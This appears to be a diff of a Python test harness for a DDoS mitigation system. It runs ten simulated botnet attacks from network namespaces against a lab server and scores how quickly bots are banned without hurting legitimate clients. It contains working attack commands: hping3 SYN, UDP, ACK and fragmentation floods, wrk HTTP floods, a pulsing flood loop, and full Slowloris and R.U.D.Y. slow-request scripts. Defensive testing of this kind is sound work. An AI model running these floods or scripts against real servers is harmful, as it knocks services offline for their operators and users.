+        "fp": "Clean" if col_pass else f"{len(col_list)} FP",
+        "result": "PASS" if overall else "FAIL",
+    })
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+#  ATTACK SCENARIOS
+# ═══════════════════════════════════════════════════════════════════════════════
+
+def scenario_syn_flood(botnet, legit):
+    """S1: Distributed high-rate SYN flood."""
+    print(f"\n{YELLOW}{'='*70}")
+    print(f"  SCENARIO 1: Distributed SYN Flood (1000 SYN/s per bot)")
+    print(f"{'='*70}{RESET}")
+    procs = launch_botnet(botnet, lambda ns, ip:
+        run(f"hping3 -S -p 80 -i u1000 {SERVER_IP}", ns=ns, bg=True))
+    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=10)
+    kill_procs(procs)
+    time.sleep(1)
+    report("Distributed SYN Flood", bans, botnet, legit)
+
+
+def scenario_slow_syn(botnet, legit):
+    """S2: Distributed low-and-slow SYN flood (10 SYN/s — GRU ML target)."""
+    print(f"\n{YELLOW}{'='*70}")
+    print(f"  SCENARIO 2: Distributed Low & Slow SYN (GRU ML Target)")
+    print(f"{'='*70}{RESET}")
+    procs = launch_botnet(botnet, lambda ns, ip:
+        run(f"hping3 -S -p 80 -i u100000 {SERVER_IP}", ns=ns, bg=True))
+    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=30)
+    kill_procs(procs)
+    time.sleep(1)
+    report("Distributed Low & Slow SYN", bans, botnet, legit)
+
+
+def scenario_udp_flood(botnet, legit):
+    """S3: Distributed high-rate UDP flood."""
+    print(f"\n{YELLOW}{'='*70}")
+    print(f"  SCENARIO 3: Distributed UDP Flood")
+    print(f"{'='*70}{RESET}")
+    procs = launch_botnet(botnet, lambda ns, ip:
+        run(f"hping3 --udp -p 80 --flood {SERVER_IP}", ns=ns, bg=True))
+    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=10)
+    kill_procs(procs)
+    time.sleep(1)
+    report("Distributed UDP Flood", bans, botnet, legit)
+
+
+def scenario_http_flood(botnet, legit):
+    """S4: Distributed HTTP flood using wrk."""
+    print(f"\n{YELLOW}{'='*70}")
+    print(f"  SCENARIO 4: Distributed HTTP Flood")
+    print(f"{'='*70}{RESET}")
+    procs = launch_botnet(botnet, lambda ns, ip:
+        run(f"wrk -t2 -c50 -d30s {HTTP_URL}", ns=ns, bg=True))
+    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=15)
+    kill_procs(procs)
+    time.sleep(1)
+    report("Distributed HTTP Flood", bans, botnet, legit)
+
+
+def scenario_ack_flood(botnet, legit):
+    """S5: Distributed ACK flood (TCP state exhaustion)."""
+    print(f"\n{YELLOW}{'='*70}")
+    print(f"  SCENARIO 5: Distributed ACK Flood")
+    print(f"{'='*70}{RESET}")
+    procs = launch_botnet(botnet, lambda ns, ip:
+        run(f"hping3 -A -p 80 --flood {SERVER_IP}", ns=ns, bg=True))
+    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=10)
+    kill_procs(procs)
+    time.sleep(1)
+    report("Distributed ACK Flood", bans, botnet, legit)
+
+
+def scenario_fragmentation(botnet, legit):
+    """S6: Distributed IP fragmentation flood."""
+    print(f"\n{YELLOW}{'='*70}")
+    print(f"  SCENARIO 6: Distributed IP Fragmentation Flood")
+    print(f"{'='*70}{RESET}")
+    procs = launch_botnet(botnet, lambda ns, ip:
+        run(f"hping3 -S -p 80 -f --fragoff 20 --flood {SERVER_IP}",
+            ns=ns, bg=True))
+    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=10)
+    kill_procs(procs)
+    time.sleep(1)
+    report("Distributed Fragmentation", bans, botnet, legit)
+
+
+def scenario_slowloris(botnet, legit):
+    """S7: Distributed Slowloris from all botnet nodes."""
+    print(f"\n{YELLOW}{'='*70}")
+    print(f"  SCENARIO 7: Distributed Slowloris")
+    print(f"{'='*70}{RESET}")
+
+    script = "/tmp/_dist_slowloris.py"
+    _write_script(script, f'''import socket, random, time
+TARGET = "{SERVER_IP}"; PORT = 80; N = 8; SLEEP = 5; socks = []
+def mk():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(4); s.connect((TARGET, PORT))
+        s.send(f"GET /?r={{random.randint(0,9999)}} HTTP/1.1\\r\\n".encode())
+        s.send(f"Host: {{TARGET}}\\r\\n".encode())
+        s.send("User-Agent: SL\\r\\nAccept-language: en\\r\\n".encode())
+        return s
+    except: return None
+for _ in range(N):
+    s = mk()
+    if s: socks.append(s)
+while True:
+    for s in list(socks):
+        try: s.send(f"X-a: {{random.randint(1,9999)}}\\r\\n".encode())
+        except: socks.remove(s)
+    for _ in range(N - len(socks)):
+        s = mk()
+        if s: socks.append(s)
+    time.sleep(SLEEP)
+''')
+    procs = launch_botnet(botnet, lambda ns, ip:
+        run(f"python3 {script}", ns=ns, bg=True))
+    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=40)
+    kill_procs(procs)
+    time.sleep(1)
+    report("Distributed Slowloris", bans, botnet, legit)
+
+
+def scenario_rudy(botnet, legit):
+    """S8: Distributed R.U.D.Y. (Slow POST) from all botnet nodes."""
+    print(f"\n{YELLOW}{'='*70}")
+    print(f"  SCENARIO 8: Distributed R.U.D.Y. (Slow POST)")
+    print(f"{'='*70}{RESET}")
+
+    script = "/tmp/_dist_rudy.py"
+    _write_script(script, f'''import socket, random, time
+TARGET = "{SERVER_IP}"; PORT = 80; N = 10; SLEEP = 7; socks = []
+def mk():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(4); s.connect((TARGET, PORT))
+        s.send(f"POST /?r={{random.randint(0,9999)}} HTTP/1.1\\r\\n".encode())
+        s.send(f"Host: {{TARGET}}\\r\\n".encode())
+        s.send("User-Agent: RD\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n".encode())
+        s.send("Content-Length: 1000000\\r\\nConnection: keep-alive\\r\\n\\r\\n".encode())
+        return s
+    except: return None
+for _ in range(N):
+    s = mk()
+    if s: socks.append(s)
+while True:
+    for s in list(socks):
+        try: s.send(b"a")
+        except: socks.remove(s)
+    for _ in range(N - len(socks)):
+        s = mk()
+        if s: socks.append(s)
+    time.sleep(SLEEP)
+''')
+    procs = launch_botnet(botnet, lambda ns, ip:
+        run(f"python3 {script}", ns=ns, bg=True))
+    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=40)
+    kill_procs(procs)
+    time.sleep(1)
+    report("Distributed R.U.D.Y.", bans, botnet, legit)
+
+
+def scenario_yoyo(botnet, legit):
+    """S9: Distributed Yo-Yo (pulsing) attack."""
+    print(f"\n{YELLOW}{'='*70}")
+    print(f"  SCENARIO 9: Distributed Yo-Yo (Pulsing) Attack")
+    print(f"{'='*70}{RESET}")
+
+    script = "/tmp/_dist_yoyo.sh"
+    _write_script(script, f"""#!/bin/bash
+while true; do
+    wrk -t2 -c50 -d2s {HTTP_URL} > /dev/null 2>&1
+    sleep 6
+done
+""")
+    procs = launch_botnet(botnet, lambda ns, ip:
+        run(f"bash {script}", ns=ns, bg=True))
+    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=25)
+    kill_procs(procs)
+    time.sleep(1)
+    report("Distributed Yo-Yo", bans, botnet, legit)
+
+
+def scenario_multi_vector(botnet, legit):
+    """S10: Multi-vector: bots split across SYN, HTTP, and UDP attacks."""
+    print(f"\n{YELLOW}{'='*70}")
+    print(f"  SCENARIO 10: Multi-Vector Distributed Attack")
+    print(f"{'='*70}{RESET}")
+
+    procs = []
+    n = len(botnet)
+    third = n // 3
+
+    for ns, ip in botnet[:third]:
+        p = run(f"hping3 -S -p 80 -i u1000 {SERVER_IP}", ns=ns, bg=True)
+        if p: procs.append((p, ns, ip))
+
+    for ns, ip in botnet[third:2*third]:
+        p = run(f"wrk -t2 -c50 -d30s {HTTP_URL}", ns=ns, bg=True)
+        if p: procs.append((p, ns, ip))
+
+    for ns, ip in botnet[2*third:]:
+        p = run(f"hping3 --udp -p 80 --flood {SERVER_IP}", ns=ns, bg=True)
+        if p: procs.append((p, ns, ip))
+
+    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=20)
+    kill_procs(procs)
+    time.sleep(1)
+    report("Multi-Vector Attack", bans, botnet, legit)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+#  FINAL SUMMARY
+# ═══════════════════════════════════════════════════════════════════════════════
+
+def print_summary():
+    print(f"\n{BOLD}{YELLOW}{'='*90}")
+    print(f"  DISTRIBUTED TEST SUMMARY")
+    print(f"{'='*90}{RESET}")
+    hdr = (f"  {'Scenario':<35} | {'Banned':<10} | {'Avg TTM':<10} | "
+           f"{'Engine(s)':<18} | {'FP':<8} | {'Result'}")
+    print(hdr)
+    print(f"  {'-'*88}")
+
+    p = f = 0
+    for r in results:
+        c = GREEN if r["result"] == "PASS" else RED
+        print(f"  {r['scenario']:<35} | {r['banned']:<10} | "
+              f"{r['avg_ttm']:<10} | {r['engines']:<18} | "
+              f"{r['fp']:<8} | {c}{r['result']}{RESET}")
+        if r["result"] == "PASS":
+            p += 1
+        else:
+            f += 1
+
+    print(f"\n  {GREEN}Passed: {p}{RESET}  |  {RED}Failed: {f}{RESET}  |  "
+          f"Total: {p + f}")
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+#  MAIN
+# ═══════════════════════════════════════════════════════════════════════════════
 
 def main():
     if os.geteuid() != 0:
-        print(f"{RED}[-] Please run this script with sudo/root privileges.{RESET}")
+        print(f"{RED}[-] This script requires root privileges (sudo).{RESET}")
         sys.exit(1)
 
-    print(f"[*] Initializing Advanced Distributed DDoS Test Suite...")
-    setup_topology()
-    
-    project_dir = os.path.dirname(os.path.abspath(__file__))
-    venv_python = os.path.join(project_dir, "venv", "bin", "python")
-    slowloris_script = os.path.join(project_dir, "slowloris.py")
-    rudy_script = os.path.join(project_dir, "rudy_script.py")
+    # Dependency check
+    for tool in ["hping3", "wrk", "curl", "ping", "tc", "ip", "ethtool"]:
+        r = run(f"which {tool}")
+        if r is None or r.returncode != 0:
+            print(f"{YELLOW}[!] Warning: '{tool}' not found. "
+                  f"Some tests may fail.{RESET}")
+
+    print(f"\n{BOLD}{CYAN}"
+          f"╔══════════════════════════════════════════════════════════════╗\n"
+          f"║   DISTRIBUTED DDoS MITIGATION TESTING SUITE                ║\n"
+          f"║   {LEGIT_COUNT} Legit Clients  |  {BOTNET_COUNT} Botnet Nodes"
+          f"                      ║\n"
+          f"╚══════════════════════════════════════════════════════════════╝"
+          f"{RESET}\n")
+
+    legit, botnet = build_topology()
+    start_legit_traffic(legit)
+
+    print(f"\n{CYAN}[*] Baseline settling period (5s)...{RESET}")
+    time.sleep(5)
 
     try:
-        run_scenario("Distributed Low & Slow SYN Flood", f"hping3 -S -p 80 -i u10000 {SERVER_IP}", duration=15)
-        run_scenario("Distributed UDP Flood", f"hping3 --udp -p 80 -i u5000 {SERVER_IP}", duration=15)
-        run_scenario("Distributed Slowloris", [venv_python, slowloris_script], duration=25)
-        run_scenario("Distributed R.U.D.Y.", [venv_python, rudy_script], duration=25)
-        run_scenario("Distributed HTTP Flood", ["bash", "-c", f"while true; do curl -s http://{SERVER_IP}/ > /dev/null; done"], duration=15)
+        scenario_syn_flood(botnet, legit)
+        reset_between_scenarios()
+        scenario_slow_syn(botnet, legit)
+        reset_between_scenarios()
+        scenario_udp_flood(botnet, legit)
+        reset_between_scenarios()
+        scenario_http_flood(botnet, legit)
+        reset_between_scenarios()
+        scenario_ack_flood(botnet, legit)
+        reset_between_scenarios()
+        scenario_fragmentation(botnet, legit)
+        reset_between_scenarios()
+        scenario_slowloris(botnet, legit)
+        reset_between_scenarios()
+        scenario_rudy(botnet, legit)
+        reset_between_scenarios()
+        scenario_yoyo(botnet, legit)
+        reset_between_scenarios()
+        scenario_multi_vector(botnet, legit)
     except KeyboardInterrupt:
-        print("\n[*] Tests interrupted by user.")
+        print(f"\n{YELLOW}[!] Interrupted by user.{RESET}")
     finally:
-        cleanup_topology()
+        stop_legit_traffic()
 
-    print(f"\n{YELLOW}=== DISTRIBUTED TEST SUMMARY ==={RESET}")
-    print(f"{'Scenario':<34} | {'Detection Engine':<16} | {'TTM':<10} | {'Bots Banned':<12} | {'Legit Banned':<13} | {'Result':<6}")
-    print("-" * 103)
-    for row in results:
-        scenario, engine, ttm, bots, legit, status = row
-        print(f"{scenario:<34} | {engine:<16} | {ttm:<10} | {bots:<12} | {legit:<13} | {status:<6}")
+    print_summary()
+
 
 if __name__ == "__main__":
     main()
